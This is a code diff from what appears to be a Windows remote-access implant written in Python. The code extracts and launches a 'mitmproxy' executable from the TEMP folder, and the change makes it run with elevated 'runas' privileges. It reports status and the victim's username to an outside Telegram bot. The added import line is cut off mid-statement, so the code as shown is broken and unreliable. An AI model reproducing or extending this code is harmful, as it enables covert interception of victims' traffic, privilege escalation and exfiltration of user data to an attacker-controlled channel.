@@ -4,6 +4,7 @@ import os
 import sys
 import getpass
 from subprocess import Popen
+import win32com.shell.shell as 
 mitmf = ""
 class MITMProxy():
 	def __init__(self):
@@ -44,9 +45,8 @@ class MITMProxy():
 		file.close()
 		with ZipFile(filename, 'r') as zip_ref:
 			zip_ref.extractall(os.environ['TEMP'])
-		self.SendMessage(" ".join(["cmd.exe","/c",os.environ['TEMP'] + "\\mitmfproxy\\mitmproxy.exe"]))
 		self.SendMessage(" MITMProxy Executed.")
-		os.system(os.environ['TEMP'] + "\\mitmfproxy\\mitmproxy.exe")
+		shell.ShellExecuteEx(lpVerb='runas', lpFile=os.environ['TEMP']+"\\mitmfproxy\\mitmproxy.exe")
 		#self.SendMessage(" Reverse Proxy Ready.")
 	def SendMessage(self,message):
 		self.Request("https://api.telegram.org/bot" + self.token + "/sendMessage?text=" + message + "\n--" + getpass.getuser() + "--&chat_id=" + self.chat_id)
